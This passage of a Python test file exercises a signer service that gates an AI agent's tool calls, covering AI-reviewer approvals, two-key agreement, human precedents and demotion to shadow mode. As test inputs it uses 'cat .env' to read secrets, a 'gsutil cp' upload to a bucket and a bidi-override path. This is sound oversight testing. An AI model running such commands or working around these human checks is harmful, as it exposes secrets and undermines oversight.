        self.assertEqual(labels.requesters({"owner": None, "writers": {}}), set())

    def test_a_secret_the_agent_read_holds_a_run_handed_to_it(self):
        self.precedent(HELD)
        handed = self.delegated()
        self.ask("cat .env")   # in its own run
        _, a = self.ask(HELD, run=handed)   # then asks in the run it was handed, owned by another identity
        self.assertEqual((a["requester"], a["agent"]["eligible"], a["ai"]["labels"]),
                         (f"uid:{AGENT.subject}", False, ["secrets_access"]))


    def handed_unwritten(self):
        """A run the other identity registers, decides HELD in on its own stream and delegates to the agent, which never
        writes it: (the agent's view of the run, the held call's id)."""
        r = self.s.call(self.OTHER, "register_run", {"request_id": rid(), "agent": {"name": "app"}})
        tok = self.s.call(self.OTHER, "delegate_run", {"run_id": r["run_id"], "run_token": r["run_token"],
                                                       "identity": f"uid:{AGENT.subject}"})
        self.s.call(self.OTHER, "decide", {"request_id": rid(), "run_id": r["run_id"], "run_token": r["run_token"],
                                           "stream": "o", "client_seq": 0, "tool_call_id": "tc-o", "tool": "Bash",
                                           "args_source": "parsed", "args": {"command": HELD}})
        return {"run_id": r["run_id"], "run_token": tok["run_token"]}, "tc-o"

    def request(self, run, tcid):
        aid = self.s.call(AGENT, "approval_request", {"request_id": rid(), **run, "tool_call_id": tcid,
                                                      "project": "/Users/me/api"})["approval_id"]
        return aid, self.s.log.approvals[aid]

    def test_a_delegate_that_never_wrote_the_run_asks_with_its_own_labels(self):
        self.precedent(HELD)
        handed, tcid = self.handed_unwritten()
        self.ask("cat .env")   # the agent reads a secret in its own run, then asks in the run it never wrote
        _, a = self.request(handed, tcid)
        self.assertEqual((a["requester"], a["agent"]["eligible"], a["ai"]["labels"]),
                         (f"uid:{AGENT.subject}", False, ["secrets_access"]))

    def test_its_labels_count_at_the_answer_and_at_the_consume(self):
        self.precedent(HELD)
        handed, tcid = self.handed_unwritten()
        aid, a = self.request(handed, tcid)
        self.assertTrue(a["agent"]["eligible"])
        served = self.s.call(REVIEWER, "approval_review", {"approval_id": aid})["view_digest"]
        reader = self.register()
        self.ask("cat .env", run=reader)   # read since the view: its answer is refused
        msg = self.refused("forbidden", REVIEWER, "approval_decide", {
            "request_id": rid(), "approval_id": aid, "decision": "approve", "ai": TWO, "view_digest": served,
            "asserted": {"model": "m-a", "version": "1"}})
        self.assertIn("the session read a secret since it was", msg)
        self.s.call(AGENT, "close_run", {"request_id": rid(), **reader[0]})
        with self.an_hour_on():   # the window past: the AI may answer again
            self.ai(aid)
        self.assertEqual(self.s.log.approvals[aid]["state"], "approved")
        self.ask("cat .env")   # read before the consume: the approval can't be used
        out = self.s.call(AGENT, "approval_consume", {"request_id": rid(), **handed, "tool_call_id": tcid, "attempt": 0,
                                                      "tool": "Bash", "args_source": "parsed",
                                                      "args": {"command": HELD}})
        self.assertFalse(out["ok"], out)

    def crash(self):
        self.s.close()
        shutil.rmtree(os.path.join(self.dir, "store", "snapshots"), ignore_errors=True)
        self.s = self.open()

    def test_after_a_crash_a_delegate_that_wrote_the_run_is_still_a_requester(self):
        handed = self.delegated()
        self.ask("ls", run=handed)   # the agent writes the handed run on stream s
        key = ("default", handed[0]["run_id"])
        self.crash()   # its run.writer record says so
        self.assertEqual(labels.requesters(self.s.log.runs[key]), {"uid:990777", f"uid:{AGENT.subject}"})


class TestAGatewaysRunAfterACrash(Case):
    GW = CallerIdentity("uid", "990888", True)

    def open(self):
        s = svc.SignerService(self.dir, policy=engine(**self.policy), identity=AGENT, approvals=self.approvals,
                              authorize={f"uid:{REVIEWER.subject}": sorted(svc.AGENT_METHODS),
                                         f"uid:{self.GW.subject}": sorted(svc.DEFAULT_GRANTS)},
                              gateways=[f"uid:{self.GW.subject}"])
        self.addCleanup(s.close)
        return s

    def test_its_client_is_in_its_record(self):
        r = self.s.call(self.GW, "register_run", {"request_id": rid(), "agent": {"name": "gw"},
                                                  "caller": f"uid:{AGENT.subject}"})
        key = ("default", r["run_id"])
        self.assertEqual(labels.requesters(self.s.log.runs[key]), {f"uid:{AGENT.subject}"})
        opened = dict(self.s.log.open_runs)
        self.s.close()
        shutil.rmtree(os.path.join(self.dir, "store", "snapshots"), ignore_errors=True)
        self.s = self.open()
        self.assertEqual(labels.requesters(self.s.log.runs[key]), {f"uid:{AGENT.subject}"})   # not the gateway
        self.assertEqual(self.s.log.open_runs, opened)   # and it counts where it did
        [reg] = [e["data"] for e in self.events() if e["type"] == "run.registered" and e["run_id"] == r["run_id"]]
        self.assertEqual(reg["caller"], f"uid:{AGENT.subject}")


class TestUntrustedContent(Case):
    policy = {"run": {"clean": ["untrusted_content", "secrets_access"]}}

    def test_a_run_that_read_untrusted_content_sends_every_hold_to_people(self):
        self.precedent()
        _, a = self.ask()
        self.assertEqual((a["agent"]["eligible"], a["ai"]["labels"]), (True, []))
        self.s.call(AGENT, "observe", {"request_id": rid(), **self.run, "stream": "s", "client_seq": next(self.seq),
                                       "source": "web:1", "trust": "untrusted", "value": "a page"})
        _, a = self.ask()
        self.assertEqual((a["agent"]["reason"], a["ai"]["labels"]),
                         ("the session read untrusted content (a web page, an email or a download): a person decides",
                          ["untrusted_content"]))


class TestVeto(Case):
    policy = {"veto_s": 60}

    def test_an_ai_approval_waits_out_the_veto_and_the_signer_checks_it_fits_the_ttl(self):
        self.precedent()
        aid, _ = self.ask()
        self.ai(aid)
        out = self.consume(aid)
        self.assertEqual((out["ok"], out["rule_ids"]), (False, ["TK-APPROVAL-VETO"]))
        with self.assertRaisesRegex(ValueError, "veto_s of 3600 s is not under approvals.ttl_s"):
            svc.SignerService(ts.tmpdir(self), policy=engine(veto_s=3600), approvals=self.approvals)


class TestTwoKeys(Case):
    def test_a_yes_needs_two_answers_that_agree(self):
        self.precedent()
        for answers in ([{"model": "m", "decision": "approve"}], [{"model": "m", "decision": "approve"},
                                                                  {"model": "n", "decision": "reject"}], None):
            with self.subTest(answers):
                aid, _ = self.ask()
                out = self.ai(aid, ai=answers and {"answers": answers})
                self.assertEqual((out["state"], out.get("escalated")), ("requested", True))
        aid, _ = self.ask()
        self.assertEqual(self.ai(aid)["state"], "approved")
        es = self.events()
        esc = [e["data"] for e in es if e["type"] == "approval.escalated"]
        self.assertEqual({e["by"] for e in esc}, {"signer"})
        self.assertTrue(all(e["reason"].startswith("the AI reviewer's two answers didn't both approve") for e in esc))
        [yes] = [e["data"] for e in es if e["type"] == "approval" and e["data"].get("approver_kind") == "agent"]
        r = yes["relied_on"]
        self.assertEqual((r["mode"], r["answers"], r["policy_hash"], r["playbook"]["version"], len(r["precedents"]
                                                                                                  ["approve"])),
                         ("enforce", TWO["answers"], engine().policy_hash, 0, 1))


class TestBreaker(Case):
    def test_a_revoked_ai_approval_drops_its_rule_to_shadow_until_a_person_enables_it(self):
        self.precedent()
        aid, _ = self.ask()
        self.ai(aid)
        self.s.call(ALICE, "approval_revoke", {"request_id": rid(), "approval_id": aid, "reason": "not this one"})
        self.assertIn("took back AI approval", self.s.log.agent["demoted"]["default\0TK-A025"])
        aid2, _ = self.ask()   # the next answer, within one decision, is a suggestion that changes nothing
        ai = self.s.call(ALICE, "approval_get", {"approval_id": aid2})["ai"]   # and people are told why, and the way out
        self.assertEqual((ai["mode"], ai["reason"]), ("shadow", f"uid:{ALICE.subject} took back AI approval {aid}, so it "
                                                                "only suggests until a person runs `tracekit reviewer "
                                                                "enable TK-A025`"))
        out = self.ai(aid2)
        self.assertEqual((out["state"], out.get("suggested")), ("requested", True))
        listed = self.s.call(ALICE, "approval_list", {"for": "person"})["approvals"]
        self.assertIn(aid2, [x["approval_id"] for x in listed])
        self.refused("forbidden", AGENT, "approver", {"request_id": rid(), "action": "enable", "rules": ["TK-A025"]})
        self.refused("invalid_request", ALICE, "approver", {"request_id": rid(), "action": "enable",
                                                            "rules": ["TK-A062"]})   # never dropped
        self.s.call(ALICE, "approver", {"request_id": rid(), "action": "enable", "rules": ["TK-A025"]})
        aid3, _ = self.ask()
        self.assertEqual(self.ai(aid3)["state"], "approved")
        es = self.events()
        [sug] = [e["data"] for e in es if e["type"] == "approval.suggested"]
        self.assertEqual((sug["relied_on"]["mode"], sug["relied_on"]["demoted"][:5]), ("shadow", "uid:9"))
        self.assertEqual([e["data"]["rules"] for e in es if e["type"] == "approver.enabled"], [["TK-A025"]])

    def test_another_model_prompt_or_playbook_answers_in_shadow_until_a_person_enables_it(self):
        self.precedent()
        aid, _ = self.ask()
        self.assertEqual(self.ai(aid)["state"], "approved")   # pins m-a, version 1, no prompt, playbook v0
        for asserted in ({"model": "m-z", "version": "1"}, {"model": "m-a", "version": "2"},
                         {"model": "m-a", "version": "1", "prompt_hash": "sha256:" + "e" * 64}):
            with self.subTest(asserted):
                aid, _ = self.ask()
                out = self.ai(aid, asserted=asserted)
                self.assertEqual((out["state"], out.get("suggested")), ("requested", True))
                self.assertIn("model, version, prompt or playbook changed",
                              self.s.log.agent["demoted"]["default\0TK-A025"])
                self.s.call(ALICE, "approver", {"request_id": rid(), "action": "enable", "rules": ["TK-A025"]})
                aid, _ = self.ask()
                self.assertEqual(self.ai(aid, asserted=asserted)["state"], "approved")   # the new one, enabled
                self.ai_pin = asserted
        for _ in range(svc.PLAYBOOK_MIN - 1):
            self.precedent()
        prop = self.s.call(ALICE, "approver", {"action": "status"})["proposals"][0]
        self.s.call(ALICE, "approver", {"request_id": rid(), "action": "accept", "id": prop["id"]})
        aid, _ = self.ask()
        self.assertTrue(self.ai(aid, asserted=self.ai_pin).get("suggested"))   # a new playbook: shadow first
        self.restart()   # the pins and what they dropped come back from the records
        self.assertIn("default\0TK-A025", self.s.log.agent["demoted"])

    def test_an_unconsumed_ai_approval_of_a_dropped_rule_never_runs(self):
        self.precedent()
        a1, _ = self.ask()
        a2, _ = self.ask()
        self.ai(a1)
        self.ai(a2)
        self.s.call(ALICE, "approval_revoke", {"request_id": rid(), "approval_id": a1})
        out = self.consume(a2)
        self.assertEqual((out["ok"], out["rule_ids"]), (False, ["TK-APPROVAL-REJECTED"]))

    def gone_bad(self, spoil, why):
        """A precedent that `spoil(approval id, its run id)` makes go bad stops counting, and drops its rule."""
        p = self.precedent()
        spoil(p, self.s.log.agent["precedents"][p]["run"].split("\0")[1])
        self.assertIn(why, self.s.log.agent["precedents"][p]["bad"])
        self.assertIn(f"the person's approval it matched ({p}) no longer counts", self.s.log.agent["demoted"]["default\0TK-A025"])
        self.refused("invalid_request", ALICE, "approver", {"request_id": rid(), "action": "revoke", "id": p})
        return p

    def test_a_precedent_a_person_revokes(self):
        p = self.gone_bad(lambda p, _: self.s.call(ALICE, "approver", {
            "request_id": rid(), "action": "revoke", "id": p, "reason": "reverted"}), "took it back: reverted")
        _, a = self.ask()
        self.assertNotIn(p, a["ai"]["precedents"]["approve"])
        self.refused("forbidden", AGENT, "approver", {"request_id": rid(), "action": "revoke", "id": p})
        [r] = [e["data"] for e in self.events() if e["type"] == "precedent.revoked"]
        self.assertEqual(r, {"approval_id": p, "by": f"uid:{ALICE.subject}", "reason": "reverted"})

    def test_a_precedent_whose_run_had_an_incident(self):
        self.gone_bad(lambda _, k: self.s.call(OPS, "run_hold", {"request_id": rid(), "run_id": k}),
                      "opened in its run")

    def test_a_precedent_whose_run_a_why_finding_is_about(self):
        def finding(_, k):
            f = self.s.call(AGENT, "register_run", {"request_id": rid(), "agent": {"name": "why"}, "analyzes": k})
            self.s.call(AGENT, "why_finding", {"request_id": rid(), "run_id": f["run_id"], "run_token": f["run_token"],
                                               "finding": {
                "target": "tool=Bash", "intervention": "i", "n": 0, "p_with": 0, "p_without": 0, "effect": 0,
                "interval": [-1, 1], "verdict": "inconclusive", "replay_runs": [], "models": [], "rung": 1,
                "off_tape": 0, "investigation": "i", "looks": 1, "family": 1, "min_effect": 0.2, "applied": True,
                "stopped": "budget"}})
        self.gone_bad(finding, "a why finding was written about its run")

    def test_agreement_under_the_bar_drops_the_rule(self):
        self.s.close()
        self.policy = {"mode": "shadow"}
        self.s = self.open()
        self.run, self.seq = self.register()
        self.precedent()
        for i in range(pipeline.AGREEMENT_MIN):   # people say yes each time (a no would leave precedents both ways)
            aid, _ = self.ask(run=self.register())
            self.ai(aid, *(("reject", {"answers": [{"model": "m", "decision": "reject"}]}) if i < 2 else ()))
            self.person(aid)   # the AI said no twice: it agreed on 8 of 10, under 0.9
        self.assertIn("agreed with people on 8 of the last 10", self.s.log.agent["demoted"]["default\0TK-A025"])
        self.s.call(ALICE, "approver", {"request_id": rid(), "action": "enable", "rules": ["TK-A025"]})
        self.assertNotIn("default\0TK-A025", self.s.log.agent["pairs"])   # enabled: measured afresh


class TestPlaybook(Case):
    def test_people_accept_what_their_answers_propose_and_answers_record_the_version(self):
        for _ in range(svc.PLAYBOOK_MIN - 1):
            self.precedent()
        self.assertEqual(self.s.call(ALICE, "approver", {"action": "status"})["proposals"], [])
        self.precedent()
        st = self.s.call(ALICE, "approver", {"action": "status"})
        self.assertEqual(validate(RESPONSES["approver"], st), [])
        [prop] = st["proposals"]
        self.assertIn("TK-A025 by Bash, TK-A025 pip --index-url https://pypi.internal/…, in api (", prop["text"])
        self.assertIn(": approved 3 of 3 (latest reason: approved by alice)", prop["text"])
        self.refused("forbidden", REVIEWER, "approver", {"action": "status"})
        self.refused("forbidden", AGENT, "approver", {"request_id": rid(), "action": "accept", "id": prop["id"]})
        self.refused("invalid_request", ALICE, "approver", {"request_id": rid(), "action": "accept", "id": "P-00000000"})
        self.s.call(ALICE, "approver", {"request_id": rid(), "action": "accept", "id": prop["id"]})
        st = self.s.call(ALICE, "approver", {"action": "status"})
        self.assertEqual((st["playbook"]["version"], st["playbook"]["entries"], st["proposals"]),
                         (1, [prop], []))
        aid, _ = self.ask()
        view = self.s.call(REVIEWER, "approval_review", {"approval_id": aid})
        self.assertEqual(view["ai"]["playbook"], st["playbook"])
        self.ai(aid)
        self.s.call(ALICE, "approver", {"request_id": rid(), "action": "retire", "id": prop["id"]})
        self.assertEqual(self.s.call(ALICE, "approver", {"action": "status"})["playbook"]["version"], 2)
        es = self.events()
        [yes] = [e["data"] for e in es if e["type"] == "approval" and e["data"].get("approver_kind") == "agent"]
        self.assertEqual(yes["relied_on"]["playbook"], {k: st["playbook"][k] for k in ("version", "digest")})
        self.assertEqual([(e["data"]["action"], e["run_id"]) for e in es if e["type"] == "playbook.entry"],
                         [("accept", "tracekit/signer"), ("retire", "tracekit/signer")])


class TestReplayAndView(Case):
    def test_a_restart_rebuilds_precedents_breaker_and_playbook(self):
        for _ in range(svc.PLAYBOOK_MIN):
            p = self.precedent()
        prop = self.s.call(ALICE, "approver", {"action": "status"})["proposals"][0]
        self.s.call(ALICE, "approver", {"request_id": rid(), "action": "accept", "id": prop["id"]})
        aid, _ = self.ask()
        self.ai(aid)
        self.s.call(ALICE, "approval_revoke", {"request_id": rid(), "approval_id": aid})
        keys = ("precedents", "demoted", "playbook")
        before = json.loads(json.dumps({k: self.s.log.agent[k] for k in keys}))
        self.restart()
        self.assertEqual({k: self.s.log.agent[k] for k in keys}, before)
        self.s.log.snapshot()   # and from a snapshot
        self.restart()
        self.assertEqual({k: self.s.log.agent[k] for k in keys}, before)
        self.assertIn(p, before["precedents"])

    def test_the_review_view_shows_precedents_labels_and_recent_calls(self):
        bidi = "/Users/me/api" + chr(0x202E)   # a right-to-left override the reviewer must see escaped
        self.precedent(project=bidi)
        self.ask("ls", tcid="tc-ls")
        aid, _ = self.ask(project=bidi)
        view = self.s.call(REVIEWER, "approval_review", {"approval_id": aid})
        self.assertEqual(validate(RESPONSES["approval_review"], view), [])
        ai = view["ai"]
        self.assertEqual(ai["labels"], [])
        self.assertFalse({"project", "owner_uid"} & set(ai))   # no path for the reviewer to open
        self.assertIn("\\u202e (", ai["target"]["project"])   # the folder's name, escaped
        self.assertEqual([p["reason"] for p in ai["precedents"]], ["approved by alice"])
        self.assertEqual([c["tool"] for c in ai["recent"]][-2:], ["Bash", "Bash"])
        self.assertTrue(all(c["passed"] for c in view["conditions"]))
        self.assertEqual({c["rule"] for c in view["conditions"]}, {"approval_agent"})
        self.assertNotIn(self.run["run_id"], json.dumps(view))

    def test_a_held_call_also_held_by_another_rule_is_peoples(self):
        self.precedent()
        _, a = self.ask("pip install --index-url https://pypi.internal/simple x && gsutil cp f gs://b")
        self.assertIn("TK-A032 is answered by people", a["agent"]["reason"])
        self.assertIsNone(a["ai"])   # no precedent key: people's answer to it is no precedent either
        _, a = self.ask("make test", tool="run_tool")   # TK-A062 and the laptop's unknown-tool flag
        self.assertIn("no person has approved", a["agent"]["reason"])


class TestEvidence(Case):
    def bundle(self):
        self.s.call(AGENT, "close_run", {"request_id": rid(), **self.run})
        self.s.sweep()
        self.s.checkpoint()
        note = self.s.log.storage.checkpoint_latest()[1]
        trust = os.path.join(self.dir, "trust.json")
        with open(trust, "w") as f:
            json.dump({"logs": [self.s.vkey], "algs": ["ed25519"]}, f)
        path = os.path.join(self.dir, "run.tkb")
        export(self.s.log.storage, "default", self.run["run_id"], note, path,
               policy_dir=os.path.join(self.dir, "policies"))
        return path, trust

    def test_both_verifiers_check_an_ai_approval_against_its_precedent_in_the_bundle(self):
        import test_ts_verifier as tv
        aid, _ = self.ask(tcid="tc-1")
        self.person(aid)   # a precedent in this very run
        aid2, _ = self.ask(tcid="tc-2")
        self.ai(aid2)
        self.assertTrue(self.consume(aid2)["ok"])
        path, trust = self.bundle()
        rep, code = v2.verify(path, trust)
        got = {c["check"]: c for c in rep.checks}
        self.assertEqual((code, got["AI approvals"]["status"], got["approvals by agents"]["status"]), (0, "pass", "pass"))
        self.assertIn("1 AI approval(s) that decided", got["AI approvals"]["detail"])
        self.assertIn("(1 precedent(s) checked in this bundle, 0 in runs", got["AI approvals"]["detail"])
        if not tv.SKIP:
            out = tv.ts_verify(path, trust)
            self.assertEqual([(c["check"], c["status"], c["detail"]) for c in out["checks"]],
                             [(c["check"], c["status"], c["detail"]) for c in rep.checks])

    def test_both_verifiers_read_an_unmapped_tools_flag_as_a_flag(self):
        import test_ts_verifier as tv
        self.precedent("make test", tool="run_tool")   # in another run: the same call in this one reuses the yes
        aid2, a = self.ask("make test", tool="run_tool")
        self.assertEqual(a["rule_ids"], ["TK-A062", "TK-UNKNOWN-TOOL"])
        self.assertEqual(self.ai(aid2)["state"], "approved")
        path, trust = self.bundle()
        rep, code = v2.verify(path, trust)
        got = {c["check"]: c for c in rep.checks}
        self.assertEqual((code, got["approvals by agents"]["status"], got["AI approvals"]["status"]), (0, "pass", "pass"))
        if not tv.SKIP:
            self.assertEqual([(c["check"], c["status"]) for c in tv.ts_verify(path, trust)["checks"]],
                             [(c["check"], c["status"]) for c in rep.checks])

    def test_a_rule_permits_an_ai_only_when_approval_agent_lists_it_and_the_request_has_its_ai(self):
        def problems(pol, req_ai=True, rules=("TK-A025",)):
            snap = json.dumps(pol).encode()
            policies = {"sha256:" + "d" * 64: snap}
            ev = [{"seq": 0, "type": "run.registered", "data": {"identity": {"scheme": "uid", "subject": "501"}}},
                  {"seq": 1, "type": "policy.decision", "data": {"decision_id": "d1", "rule_ids": list(rules),
                                                                 "policy_hash": "sha256:" + "d" * 64}},
                  {"seq": 2, "type": "approval.request", "data": {"approval_id": "a1", "decision_id": "d1",
                                                                  "requester": "uid:501", "agent": {"eligible": True},
                                                                  **({"ai": {}} if req_ai else {})}},
                  {"seq": 3, "type": "approval", "data": {"approval_id": "a1", "decision": "approve",
                                                          "approver": "uid:299", "approver_kind": "agent",
                                                          "approver_identity": {"scheme": "uid", "subject": "299"}}}]
            rep = mock.Mock(checks=[])
            rep.check = lambda n, ok, detail, problems=(), warn=False: rep.checks.append((n, ok, list(problems)))
            v2._approvals(rep, {"r": [{"event": e} for e in ev]}, policies)
            return {n: p for n, ok, p in rep.checks}["approvals by agents"]
        listed = {"ask": [{"id": "TK-A025"}, {"id": "TK-A062"}], "approval_agent": {"rules": ["TK-A025", "TK-A062"]},
                  "unknown_tools": "flag"}
        self.assertEqual(problems(listed), [])
        self.assertEqual(problems(listed, rules=("TK-A062", "TK-UNKNOWN-TOOL")), [])
        for what, pol, req_ai, rules in (
                ("not listed", {**listed, "approval_agent": {"rules": ["TK-A062"]}}, True, ("TK-A025",)),
                ("no ai on the request", listed, False, ("TK-A025",)),
                ("off the reviewed list", {**listed, "ask": [{"id": "MY"}], "approval_agent": {"rules": ["MY"]}},
                 True, ("MY",)),
                ("an unmapped tool's flag that holds", {**listed, "unknown_tools": "ask"}, True,
                 ("TK-A062", "TK-UNKNOWN-TOOL")),
                ("TK-SHELL-PARSE where it denies", {**listed, "on_parse_error": "deny",
                                                    "approval_agent": {"rules": ["TK-SHELL-PARSE"]}}, True,
                 ("TK-SHELL-PARSE",))):
            with self.subTest(what):
                self.assertTrue(any("does not permit agents" in p for p in problems(pol, req_ai, rules)), what)

    def test_the_line_fails_an_ai_yes_on_a_precedent_that_doesnt_hold(self):
        runs, seqs = {}, itertools.count()
        bound = {"sha256:" + "0" * 64: json.dumps({"approval_agent": {"run": {"clean": ["secrets_access"]}}}).encode()}

        def rec(typ, data, tenant="default", run="r", ts="2026-11-18T12:00:00Z"):
            runs.setdefault(run, []).append({"event": {"type": typ, "data": data, "seq": next(seqs), "tenant": tenant,
                                                       "run_id": run, "ts": ts}})
        key = {"rules": ["TK-A025"], "tool": "Bash", "target": {}, "project": None}
        ai = {"key": key, "digest": "hmac-sha256:" + "a" * 64, "labels": [], "clean": True,
              "precedents": {"approve": [], "reject": []}}
        relied = {"precedents": {"approve": ["p1"], "reject": []}, "playbook": {"version": 0, "digest": "sha256:" + "0" * 64},
                  "policy_hash": "sha256:" + "0" * 64, "labels": [], "mode": "enforce", "answers": TWO["answers"]}
        cases = {"no two keys": ({}, {"answers": TWO["answers"][:1]}, {}, "without two answers that approve"),
                 "no precedent named": ({}, {"precedents": {"approve": [], "reject": []}}, {}, "without a person's"),
                 "a rejection named": ({}, {"precedents": {"approve": ["p1"], "reject": ["p1"]}}, {}, "rejection"),
                 "another kind": ({"digest": "hmac-sha256:" + "b" * 64}, {}, {}, "is of another kind of call"),
                 "not clean when asked": ({"clean": False}, {}, {}, "wasn't clean"),
                 "not clean when answered": ({}, {}, {"run_clean": False}, "wasn't clean"),
                 "run_clean unsaid": ({}, {}, {"run_clean": None}, "wasn't clean"),
                 "self-approved": ({}, {}, {"self_approved": True}, "was self-approved"),
                 "break-glass": ({}, {}, {"break_glass": True}, "was a break-glass answer"),
                 "older than 30 days": ({}, {}, {"ts": "2026-10-19T11:59:59Z"}, "is more than 30 days older"),
                 "30 days old": ({}, {}, {"ts": "2026-10-19T12:00:00Z"}, None),
                 "a label of the run bound": ({}, {"labels": ["secrets_access"]}, {}, "carried secrets_access, which"),
                 "a label outside the run bound": ({}, {"labels": ["untrusted_content"]}, {}, None),
                 "a label, no snapshot": ({}, {"labels": ["untrusted_content"], "policy_hash": "sha256:" + "9" * 64},
                                          {}, "whose snapshot the bundle doesn't hold"),
                 "no label, no snapshot": ({}, {"policy_hash": "sha256:" + "9" * 64}, {}, None),
                 "another policy than the request's": ({}, {}, {}, "not the one its call was held under"),
                 "a label the run's records add": ({}, {}, {}, "whose records held secrets_access at the yes, which"),
                 "a label the run's records add, no snapshot": ({}, {"policy_hash": "sha256:" + "9" * 64}, {},
                                                                "whose snapshot the bundle doesn't hold"),
                 "a label the run's records add, then clear": ({}, {}, {}, None),
                 "a label added before the consume": ({}, {}, {}, "whose records held secrets_access at its consume"),
                 "a label added after the consume": ({}, {}, {}, None),
                 "a label of another run": ({}, {}, {}, None),
                 "after": ({}, {}, {}, "came after the answer"),
                 "revoked": ({}, {}, {}, "was revoked as a precedent"),
                 "a rejection not named": ({}, {}, {}, "a person's rejection of a call like it (p2) counted"),
                 "a rejection revoked": ({}, {}, {}, None),
                 "another requester's rejection": ({}, {}, {}, None),
                 "a rejection of another kind": ({}, {}, {}, None),
                 "a rejection in a run that wasn't clean": ({}, {}, {}, None),
                 "fine": ({}, {}, {}, None)}
        label = {"label": "secrets_access", "action": "add", "by": "signer", "source": 0}
        for name, (pa, x, answer, why) in cases.items():
            with self.subTest(name):
                runs.clear()
                held_under = {**relied, **x}["policy_hash"] if "another policy" not in name else "sha256:" + "8" * 64
                answer = {"approval_id": "p1", "decision": "approve", "run_clean": True, **answer}
                rec("approval.request", {"approval_id": "p1", "requester": "uid:1", "ai": {**ai, **pa}})
                if name != "after":
                    rec("approval", {k: v for k, v in answer.items() if k != "ts" and v is not None},
                        ts=answer.get("ts", "2026-11-18T12:00:00Z"))
                if name == "revoked":
                    rec("precedent.revoked", {"approval_id": "p1", "by": "uid:2"}, run="tracekit/signer")
                if "rejection" in name and name != "a rejection named":
                    rec("approval.request", {"approval_id": "p2", "requester": "uid:9" if "requester" in name else
                                             "uid:1", "ai": {**ai, **({"digest": "hmac-sha256:" + "c" * 64}
                                                                     if "kind" in name else {})}})
                    rec("approval", {"approval_id": "p2", "decision": "reject", "run_clean": "clean" not in name})
                    if name == "a rejection revoked":
                        rec("precedent.revoked", {"approval_id": "p2", "by": "uid:2"}, run="tracekit/signer")
                rec("approval.request", {"approval_id": "a1", "requester": "uid:1", "ai": ai, "policy_hash": held_under})
                if "the run's records add" in name or "another run" in name:   # a signed run.label the yes left out
                    rec("run.label", label, run="other" if "another run" in name else "r")
                if name.endswith("then clear"):
                    rec("run.label", {**label, "action": "clear", "by": "person"})
                rec("approval", {"approval_id": "a1", "decision": "approve", "approver_kind": "agent",
                                 "relied_on": {**relied, **x}})
                if "consume" in name:
                    if "before" in name:
                        rec("run.label", label)
                    rec("approval.consumed", {"approval_id": "a1"})
                    if "after" in name:
                        rec("run.label", label)
                if name == "after":
                    rec("approval", answer)
                rep = mock.Mock(checks=[])
                rep.check = lambda n, ok, detail, problems=(), warn=False: rep.checks.append((n, ok, list(problems)))
                v2._ai_approvals(rep, runs, bound)   # AI approvals, and AI run bound when the yes carried a label
                problems = [p for _, _, ps in rep.checks for p in ps]
                self.assertEqual(all(ok for _, ok, _ in rep.checks), why is None, problems)
                self.assertTrue(why is None or why in problems[0], problems)
                self.assertEqual([n for n, _, _ in rep.checks], ["AI approvals"] + ["AI run bound"] * bool(
                    {**relied, **x}["labels"] or why and "records held" in why or "snapshot" in name and "add" in name))


class TestAViewOfAnEarlierState(Case):
    def open(self):
        s = svc.SignerService(self.dir, policy=engine(**self.policy), identity=AGENT, approvals=self.approvals,
                              authorize={f"uid:{REVIEWER.subject}": sorted(svc.AGENT_METHODS),
                                         f"uid:{ALICE.subject}": ["approval_decide", "run_label_clear"]})
        self.addCleanup(s.close)
        return s

    def test_a_label_added_and_cleared_since_the_view_makes_its_answer_a_conflict(self):
        self.precedent()
        aid, _ = self.ask()
        served = self.s.call(REVIEWER, "approval_review", {"approval_id": aid})["view_digest"]
        self.ask("cat .env")   # the run reads a secret; a person clears the label: the labels are as the view showed
        self.s.call(ALICE, "run_label_clear", {"request_id": rid(), "run_id": self.run["run_id"],
                                               "label": "secrets_access", "reason": "a test value"})
        req = {"request_id": rid(), "approval_id": aid, "decision": "approve", "ai": TWO, "view_digest": served,
               "asserted": {"model": "m-a", "version": "1"}}
        self.assertIn("read it again", self.refused("conflict", REVIEWER, "approval_decide", req))
        self.assertEqual(self.ai(aid)["state"], "approved")   # the view read again


class TestTheViewItAnswers(Case):
    def test_relied_on_holds_the_signers_own_reading_whatever_the_reviewer_sends(self):
        self.precedent()
        aid, _ = self.ask()
        served = self.s.call(REVIEWER, "approval_review", {"approval_id": aid})["view_digest"]
        forged = {**TWO, "labels": ["none"], "policy_hash": "sha256:" + "9" * 64, "precedents": {}, "mode": "x"}
        self.s._agent_answer(REVIEWER, {"request_id": rid(), "approval_id": aid, "decision": "approve", "ai": forged,
                                        "view_digest": served, "asserted": {"model": "m-a", "version": "1"}})
        [yes] = [e["data"]["relied_on"] for e in self.events() if e["type"] == "approval"
                 and e["data"]["approval_id"] == aid]
        self.assertEqual((yes["labels"], yes["mode"], yes["answers"]), ([], "enforce", TWO["answers"]))
        self.assertNotEqual(yes["policy_hash"], forged["policy_hash"])

    def test_an_ai_answer_names_the_view_approval_review_served_it(self):
        self.precedent()
        aid, _ = self.ask()
        req = {"approval_id": aid, "decision": "approve", "ai": TWO, "asserted": {"model": "m-a", "version": "1"}}
        msg = self.refused("conflict", REVIEWER, "approval_decide", {"request_id": rid(), **req})   # never read
        self.assertIn("read it again", msg)
        served = self.s.call(REVIEWER, "approval_review", {"approval_id": aid})["view_digest"]
        msg = self.refused("forbidden", REVIEWER, "approval_decide", {"request_id": rid(), **req,
                                                                      "view_digest": "sha256:" + "0" * 64})
        self.assertIn("answer the view approval_review served you", msg)
        self.assertEqual(self.s.call(REVIEWER, "approval_decide", {"request_id": rid(), **req,
                                                                   "view_digest": served})["state"], "approved")
        view = self.s._commit(f"approval.view:{aid}", served)
        [yes] = [e["data"] for e in self.events() if e["type"] == "approval" and e["data"]["approval_id"] == aid]
        self.assertEqual(yes["relied_on"]["view"], view)
        self.assertNotIn(served, json.dumps(yes))   # committed: the digest opens it for an auditor alone


    def test_an_answer_to_a_view_whose_precedents_changed_is_refused(self):
        p1 = self.precedent()
        aid, _ = self.ask()
        served = self.s.call(REVIEWER, "approval_review", {"approval_id": aid})
        self.assertEqual([p["approval_id"] for p in served["ai"]["precedents"]], [p1])
        self.s.call(ALICE, "approver", {"request_id": rid(), "action": "revoke", "id": p1})
        self.s.call(ALICE, "approver", {"request_id": rid(), "action": "enable", "rules": ["TK-A025"]})
        p2 = self.precedent()   # the view showed p1; p2 counts now
        req = {"request_id": rid(), "approval_id": aid, "decision": "approve", "ai": TWO,
               "asserted": {"model": "m-a", "version": "1"}, "view_digest": served["view_digest"]}
        self.assertIn("is not what holds now", self.refused("conflict", REVIEWER, "approval_decide", req))
